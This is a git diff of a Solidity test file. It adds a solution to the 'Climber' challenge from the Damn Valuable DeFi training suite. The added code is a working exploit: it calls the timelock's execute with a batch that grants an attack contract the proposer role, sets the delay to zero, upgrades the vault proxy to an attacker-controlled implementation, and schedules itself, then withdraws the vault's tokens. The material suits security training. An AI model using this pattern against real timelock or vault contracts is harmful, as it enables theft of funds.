@@ -8,6 +8,10 @@ import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 
+import {BuggyVault} from "../../src/attacker-contracts/climber/BuggyVault.sol";
+
+import {AttackTimelock} from "../../src/attacker-contracts/climber/AttackTimelock.sol";
+
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -85,7 +89,85 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+
+        bytes32 salt = keccak256("attack proposal");
+        bytes memory emptyBytes;
+
+        // Deploy our attacking contract
+        AttackTimelock attackContract = new AttackTimelock(
+            address(vault),
+            payable(address(timelock)),
+            address(token),
+            player);
+
+        // Deploy contract that will act as new logic contract for vault
+        BuggyVault buggyVault = new BuggyVault();
+
+        // Set proposal rule to the timelock contract
+        bytes memory grantRoleData = abi.encodeWithSignature(
+            "grantRole(bytes32,address)", 
+            PROPOSER_ROLE,
+            attackContract
+        );
+
+        // Update delay to 0
+         bytes memory updateDelayData = abi.encodeWithSignature(
+            "updateDelay(uint64)", 
+            0
+        );
+
+        // Call to the vault to upgrade to attacker controlled contract logic
+        bytes memory upgradeData = abi.encodeWithSignature(
+            "upgradeToAndCall(address,bytes)", 
+            address(buggyVault),
+            emptyBytes
+        );
+
+        // Call Attacking Contract to schedule these actions and sweep funds
+        bytes memory exploitData = abi.encodeWithSignature(
+            "exploit()"
+        );
+
+
+        address[] memory targets = new address[](4);
+        uint256[] memory emptyData = new uint256[](4);
+        bytes[] memory dataElements = new bytes[](4);
+
+        // grant propersal role to climbertimelock
+        targets[0] = address(timelock);
+        dataElements[0] = grantRoleData;
+
+        // set the delay to 0
+        targets[1] = address(timelock);
+        dataElements[1] = updateDelayData;
+
+        // upgrade vault to buggy vault
+        targets[2] = address(vault);
+        dataElements[2] = upgradeData;
+
+        // create the proposal
+        targets[3] = address(attackContract);
+        dataElements[3] = exploitData;
+
+        // Set our 4 calls to attacking contract
+        attackContract.setScheduleData(
+            targets,
+            dataElements
+        );
+
+        vm.warp(block.timestamp + 1);
+        // execute the 4 calls
+        timelock.execute(
+            targets,
+            emptyData,
+            dataElements,
+            salt
+        );
+
+        // Withdraw our funds from attacking contract
+        attackContract.withdraw(recovery);
+
+           
     }
 
     /**
